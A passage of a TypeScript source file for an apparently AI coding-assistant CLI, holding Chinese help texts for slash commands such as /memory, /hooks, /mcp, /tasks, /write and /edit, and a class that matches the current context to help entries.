  /memory --list (-l)        - 列出所有记忆文件
  /memory --create <name>    - 创建新的记忆文件
  /memory --show <name>      - 显示记忆文件内容
  /memory --edit <name>      - 编辑记忆文件
  /memory --delete <name>    - 删除记忆文件
  /memory status             - 显示记忆系统状态
  /memory <name>             - 显示指定记忆文件
  /memory --json             - 以 JSON 格式输出概览
  /memory help               - 显示详细帮助

功能说明:
  创建记忆文件   - 在 ~/.pyapp/memory/ 目录下创建 .md 文件
  编辑记忆文件   - 使用 $EDITOR 或 $VISUAL 环境变量指定的编辑器
  显示记忆文件   - 查看记忆文件内容
  删除记忆文件   - 从磁盘删除记忆文件
  --json 输出    - 所有子命令均支持 JSON 格式化输出

示例:
  /memory
  /memory --list
  /memory --create my-knowledge
  /memory --show my-knowledge
  /memory --edit my-knowledge
  /memory --delete old-memory
  /memory status
  /memory --json
  /memory my-knowledge

别名: /mem, /记忆
    `.trim(),
    relatedCommands: ['memory', 'mem', '记忆'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'memory', matchType: 'startsWith' },
      { type: 'command', value: 'mem', matchType: 'startsWith' },
      { type: 'command', value: '记忆', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'hooks',
    description: '钩子系统帮助',
    helpContent: `
钩子系统帮助:
- 使用 "/hooks" 命令查看和管理钩子系统
- 钩子是在特定事件触发时自动执行的脚本或回调

/hooks 命令用法:
  /hooks                    - 列出所有钩子
  /hooks --list (-l)        - 列出所有钩子
  /hooks --stats (-s)       - 显示钩子统计信息
  /hooks --test (-t)        - 测试所有钩子
  /hooks status             - 显示钩子系统状态
  /hooks --json             - 以 JSON 格式输出
  /hooks help               - 显示详细帮助

钩子事件类型:
  system.*       - 系统启动/关闭事件
  session.*      - 会话开始/结束事件
  compression.*  - 内容压缩事件
  memory.*       - 记忆保存/加载事件

示例:
  /hooks
  /hooks --list
  /hooks --stats
  /hooks --test
  /hooks status
  /hooks --json

别名: /hook, /triggers
    `.trim(),
    relatedCommands: ['hooks', 'hook', 'triggers'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'hooks', matchType: 'startsWith' },
      { type: 'command', value: 'hook', matchType: 'startsWith' },
      { type: 'command', value: 'triggers', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'mcp',
    description: 'MCP系统帮助',
    helpContent: `
MCP系统帮助:
- 使用 "/mcp" 命令查看和管理 MCP（Model Context Protocol）服务器
- MCP 是用于扩展 AI 助手功能的协议，可注册外部工具和服务

/mcp 命令用法:
  /mcp                    - 列出所有 MCP 服务器
  /mcp --list (-l)        - 列出所有 MCP 服务器
  /mcp --status (-s)      - 显示 MCP 状态报告
  /mcp --tools (-t)       - 显示 MCP 工具列表
  /mcp --test (-e)        - 测试 MCP 连接
  /mcp status             - 显示 MCP 系统状态
  /mcp --json             - 以 JSON 格式输出
  /mcp help               - 显示详细帮助

服务器状态类型:
  connected    - 已连接
  failed       - 连接失败
  disabled     - 已禁用
  pending      - 等待连接
  needs-auth   - 需要认证

示例:
  /mcp
  /mcp --list
  /mcp --status
  /mcp --tools
  /mcp --test
  /mcp status
  /mcp --json

别名: /mcp-server, /mcp-manager
    `.trim(),
    relatedCommands: ['mcp', 'mcp-server', 'mcp-manager'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'mcp', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'model',
    description: '模型管理帮助',
    helpContent: `
模型管理帮助:
使用 "/model" 命令查看和切换当前 AI 模型。使用 ModelManager 作为唯一数据源。

用法:
  /model                       显示当前模型和可用模型列表
  /model <model-id|alias>      切换到指定模型（支持别名）
  /model info <model-id>       查看模型详细信息（上下文窗口、最大输出、定价）
  /model all                   列出所有提供商下的可用模型
  /model --json                以 JSON 格式输出当前模型和可用模型
  /model help                  显示详细帮助

常用别名:
  sonnet, sonnet[1m]        - Claude Sonnet 4.6
  opus, opus[1m], best      - Claude Opus 4.6
  haiku                     - Claude 3.5 Haiku

示例:
  /model
  /model sonnet
  /model info claude-sonnet-4-6
  /model all
  /model --json

别名: /models, /ml, /list-models
    `.trim(),
    relatedCommands: ['model', 'models', 'ml', 'list-models'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'model', matchType: 'startsWith' },
      { type: 'command', value: 'models', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'plugins',
    description: '插件系统帮助',
    helpContent: `
插件系统帮助:
- 使用 "/plugins" 命令查看和管理插件系统
- 插件是扩展应用功能的模块化组件

/plugins 命令用法:
  /plugins                    - 列出所有插件
  /plugins --list (-l)        - 列出所有插件
  /plugins --status (-s)      - 显示插件状态报告
  /plugins --test (-t)        - 测试所有插件
  /plugins status             - 显示插件系统状态
  /plugins --json             - 以 JSON 格式输出
  /plugins help               - 显示详细帮助

插件状态:
  ACTIVATED    - 已激活（正常工作）
  LOADED       - 已加载（等待激活）
  DEACTIVATED  - 已停用
  FAILED       - 加载失败

示例:
  /plugins
  /plugins --list
  /plugins --status
  /plugins --test
  /plugins status
  /plugins --json

别名: /plugin, /extensions
    `.trim(),
    relatedCommands: ['plugins', 'plugin', 'extensions'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'plugins', matchType: 'startsWith' },
      { type: 'command', value: 'plugin', matchType: 'startsWith' },
      { type: 'command', value: 'extensions', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'version-info',
    description: '版本信息帮助',
    helpContent: `
版本信息帮助:
- 使用 "/version" 命令查看 PY_APP 系统版本和运行环境信息
- 支持详细状态和 JSON 格式输出

/version 命令用法:
  /version              - 显示版本信息
  /version status       - 显示详细运行状态
  /version --json       - 以 JSON 格式输出
  /version help         - 显示帮助

版本信息包含:
  - 应用名称与版本号
  - 应用描述
  - Node.js 版本
  - 操作系统平台与架构

状态信息额外包含:
  - 进程 PID
  - 运行时长
  - 当前工作目录

示例:
  /version
  /version status
  /version --json

别名: /v, /ver
    `.trim(),
    relatedCommands: ['version', 'v', 'ver'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'version', matchType: 'startsWith' },
      { type: 'command', value: 'v', matchType: 'exact' },
      { type: 'command', value: 'ver', matchType: 'exact' },
    ],
  },
  {
    contextId: 'activity-stats',
    description: '工作活动统计帮助',
    helpContent: `
工作活动统计帮助:
- 使用 "/activity" 命令查看工作活动统计信息
- 统计代码行数、后台任务、会话和系统运行时间
- 支持多种维度查看

/activity 命令用法:
  /activity              - 显示综合活动摘要
  /activity summary     - 显示综合活动摘要
  /activity code        - 显示项目代码统计（语言分布）
  /activity tasks       - 显示后台任务统计
  /activity time        - 显示时间统计（运行时长、会话概览）
  /activity status      - 显示快速状态概览
  /activity --json      - 以 JSON 格式输出统计信息
  /activity help        - 显示本帮助

摘要信息包含:
  - 系统运行时间与命令数
  - 会话与消息统计
  - 代码文件与行数统计
  - 后台任务完成情况

示例:
  /activity
  /activity code
  /activity status
  /activity --json

别名: /act, /worksummary, /工作统计
    `.trim(),
    relatedCommands: ['activity', 'act', 'worksummary', '工作统计'],
    relatedTools: [],
    matchConditions: [
      { type: 'command', value: 'activity', matchType: 'startsWith' },
      { type: 'command', value: 'act', matchType: 'exact' },
      { type: 'command', value: 'worksummary', matchType: 'exact' },
      { type: 'command', value: '工作统计', matchType: 'exact' },
    ],
  },
  {
    contextId: 'tasks',
    description: '后台任务管理帮助',
    helpContent: `
Tasks 命令帮助:

使用 "/tasks" 命令查看和管理后台运行的任务（BackgroundTask）。

用法:
  /tasks                       显示所有后台任务（按状态分组）
  /tasks list                  同上
  /tasks running               显示运行中的任务
  /tasks pending               显示等待中的任务
  /tasks completed             显示已完成的任务
  /tasks failed                显示失败的任务
  /tasks aborted               显示已中断的任务
  /tasks active                显示活跃任务（运行中+等待中）
  /tasks recent [n]            显示最近完成的任务（默认5条）
  /tasks all                   显示所有任务（包括已完成的）
  /tasks show <task-id>        查看任务详情
  /tasks stop <task-id>        停止任务
  /tasks clear [hours]         清理已完成的任务（默认清理所有）
  /tasks stats                 显示统计摘要
  /tasks --json                以 JSON 格式输出任务列表
  /tasks --limit N             限制输出任务数量（默认20）
  /tasks help                  显示此帮助

输出内容:
  列表 - 按运行中/等待中/已完成/失败/已中断分组，显示数量、ID前缀、描述、Agent类型、耗时
  详情 - 完整任务信息（ID/Agent/描述/状态/时间/Token用量/结果/错误详情）
  JSON - total/stats/tasks 结构化数据（包含完整字段）
  统计 - 各类别计数 + 活跃任务实时状态 + 进度条（运行超过10秒）

数据来源:
  所有数据来自 BackgroundTaskManager（AgentTool 后台任务管理器）

示例:
  /tasks
  /tasks running
  /tasks recent
  /tasks recent 10
  /tasks show bg-a1b2c3d4
  /tasks stats --json
  /tasks stop bg-a1b2c3d4
  /tasks clear
  /tasks clear 24
  /tasks --limit 10

别名: /bashes
    `.trim(),
    relatedCommands: ['tasks', 'bashes'],
    relatedTools: ['AgentTool'],
    matchConditions: [
      { type: 'command', value: 'tasks', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'write',
    description: '写入文件命令帮助',
    helpContent: `
Write 命令帮助:

使用 "/write" 命令将内容写入文件。

用法:
  /write <file_path> <content>       写入内容到文件（覆盖）
  /write <file_path> <content> --append  追加内容到文件末尾
  /write --json <file_path> <content>  以 JSON 格式输出结果
  /write help                         显示此帮助

参数:
  file_path  目标文件路径（可包含目录，会自动创建）
  content   要写入的文本内容

选项:
  --json    以 JSON 格式输出结果
  --append  追加模式，不覆盖现有内容

示例:
  /write test.txt Hello, world!
  /write src/config.json {"key": "value"}
  /write notes.txt "Another line" --append
  /write output.txt "Line 1" --append --json
    `.trim(),
    relatedCommands: ['write', 'edit', 'read'],
    relatedTools: ['FileWriteTool'],
    matchConditions: [
      { type: 'command', value: 'write', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'edit',
    description: '编辑文件命令帮助',
    helpContent: `
Edit 命令帮助:

使用 "/edit" 命令编辑文件内容（SearchReplace模式）。

用法:
  /edit <file_path> <old_string> <new_string>     替换首个匹配项
  /edit <file_path> <old_string> <new_string> --all  替换所有匹配项
  /edit --json <file_path> <old_string> <new_string>  以 JSON 格式输出
  /edit help                                       显示此帮助

参数:
  file_path    文件路径（支持相对路径和绝对路径）
  old_string   要替换的旧文本（请确保唯一性，除非使用 --all）
  new_string   替换后的新文本

选项:
  --json       以 JSON 格式输出结果
  --all / -a   替换所有匹配项（默认只替换第一个）

示例:
  /edit test.txt Hello Hi
  /edit src/app.ts "oldFunction()" "newFunction()"
  /edit config.json "localhost" "127.0.0.1" --all
  /edit package.json "1.0.0" "1.0.1" -a
  /edit data.txt "foo" "bar" --json
    `.trim(),
    relatedCommands: ['edit', 'write', 'read'],
    relatedTools: ['FileEditTool'],
    matchConditions: [
      { type: 'command', value: 'edit', matchType: 'startsWith' },
    ],
  },
  {
    contextId: 'glob',
    description: '文件匹配命令帮助',
    helpContent: `
Glob 命令帮助:

使用 "/glob" 命令匹配文件路径（支持 Glob 模式）。

用法:
  /glob <pattern>           匹配文件路径
  /glob <pattern> --json    以 JSON 格式输出结果
  /glob help                显示此帮助

Glob 模式说明:
  *       匹配任意字符（不包括路径分隔符）
  **      匹配任意字符（包括路径分隔符，可跨目录）
  ?       匹配单个字符
  [abc]   匹配字符集中的任意一个
  [!abc]  匹配不在字符集中的任意字符

示例:
  /glob *.ts
  /glob src/**/*.js
  /glob **/*.{ts,tsx}
  /glob tests/**/*.spec.ts
  /glob **/*.json --json

注意:
  默认跳过以 "." 开头的隐藏文件和目录
  搜索范围从当前工作目录开始
    `.trim(),
    relatedCommands: ['glob', 'read', 'search'],
    relatedTools: ['GlobTool'],
    matchConditions: [
      { type: 'command', value: 'glob', matchType: 'startsWith' },
    ],
  },
];

/**
 * 上下文帮助管理器类
 */
export class ContextHelp {
  private helpEntries: Map<string, ContextHelpEntry> = new Map();

  /**
   * 构造函数
   */
  constructor() {
    // 加载默认上下文帮助
    for (const entry of DEFAULT_CONTEXT_HELP) {
      this.helpEntries.set(entry.contextId, entry);
    }
  }

  /**
   * 注册上下文帮助
   * @param entry 上下文帮助条目
   */
  registerContextHelp(entry: ContextHelpEntry): void {
    this.helpEntries.set(entry.contextId, entry);
  }

  /**
   * 获取上下文帮助
   * @param contextId 上下文ID
   * @returns 上下文帮助条目或undefined
   */
  getContextHelp(contextId: string): ContextHelpEntry | undefined {
    return this.helpEntries.get(contextId);
  }

  /**
   * 获取所有上下文帮助
   * @returns 上下文帮助数组
   */
  getAllContextHelp(): ContextHelpEntry[] {
    return Array.from(this.helpEntries.values());
  }

  /**
   * 根据上下文检测匹配的帮助
   * @param context 当前上下文
   * @returns 匹配的上下文帮助数组
   */
  findMatchingHelp(context: {
    command?: string;
    tool?: string;
    file?: string;
    error?: string;
  }): ContextHelpEntry[] {
    const matches: ContextHelpEntry[] = [];

    for (const entry of this.helpEntries.values()) {
      if (this.matchesContext(entry, context)) {
        matches.push(entry);
      }
    }

    return matches;
  }

  /**
   * 检查条目是否匹配上下文
   * @param entry 上下文帮助条目
   * @param context 当前上下文
   * @returns 是否匹配
   */
  private matchesContext(
    entry: ContextHelpEntry,
    context: {
      command?: string;
      tool?: string;
      file?: string;
      error?: string;
    }
  ): boolean {
    for (const condition of entry.matchConditions) {
      const contextValue = this.getContextValue(condition.type, context);
      if (!contextValue) continue;

      if (this.matchesCondition(contextValue, condition)) {
        return true;
      }
    }

    return false;
  }

  /**
   * 获取上下文值
   * @param type 条件类型
   * @param context 当前上下文
   * @returns 上下文值
   */
  private getContextValue(
    type: string,
    context: {
      command?: string;
      tool?: string;
      file?: string;
      error?: string;
    }
  ): string | undefined {
    switch (type) {
      case 'command':
        return context.command;
      case 'tool':
        return context.tool;
      case 'file':
        return context.file;
      case 'error':
        return context.error;
      default:
        return undefined;
    }
  }

  /**
   * 检查值是否匹配条件
   * @param value 值
   * @param condition 条件
   * @returns 是否匹配
   */
  private matchesCondition(
    value: string,
    condition: ContextMatchCondition
  ): boolean {
    switch (condition.matchType) {
      case 'exact':
        return value === condition.value;
      case 'contains':
        return value.includes(condition.value);
      case 'startsWith':
        return value.startsWith(condition.value);
      case 'endsWith':
        return value.endsWith(condition.value);
      case 'regex':
        try {
          const regex = new RegExp(condition.value);
          return regex.test(value);
        } catch {
          return false;
        }
      default:
        return false;
    }
  }

  /**
   * 获取相关命令
   * @param contextId 上下文ID
   * @returns 相关命令数组
   */
  getRelatedCommands(contextId: string): string[] {
    const entry = this.helpEntries.get(contextId);
    return entry?.relatedCommands || [];
  }

  /**
   * 获取相关工具
   * @param contextId 上下文ID
   * @returns 相关工具数组
   */
  getRelatedTools(contextId: string): string[] {
    const entry = this.helpEntries.get(contextId);
    return entry?.relatedTools || [];
  }

  /**
   * 格式化帮助内容
   * @param entry 上下文帮助条目
   * @returns 格式化字符串
   */
  formatHelpContent(entry: ContextHelpEntry): string {
    const lines = [
      `=== ${entry.description} ===`,
      '',
      entry.helpContent,
    ];

    if (entry.relatedCommands.length > 0) {
      lines.push('', '相关命令:');
      entry.relatedCommands.forEach((cmd) => {
        lines.push(`  - ${cmd}`);
      });
    }

    if (entry.relatedTools.length > 0) {
      lines.push('', '相关工具:');
      entry.relatedTools.forEach((tool) => {
        lines.push(`  - ${tool}`);
      });
    }

    return lines.join('\n');
  }

  /**
   * 删除上下文帮助
   * @param contextId 上下文ID
   */
  removeContextHelp(contextId: string): void {
    this.helpEntries.delete(contextId);
  }

  /**
   * 清除所有上下文帮助
   */
  clearContextHelp(): void {
    this.helpEntries.clear();
  }

  /**
   * 获取上下文帮助数量
   * @returns 上下文帮助数量
   */
  getContextHelpCount(): number {
    return this.helpEntries.size;
  }
}

// 导出单例实例
export const contextHelp = new ContextHelp();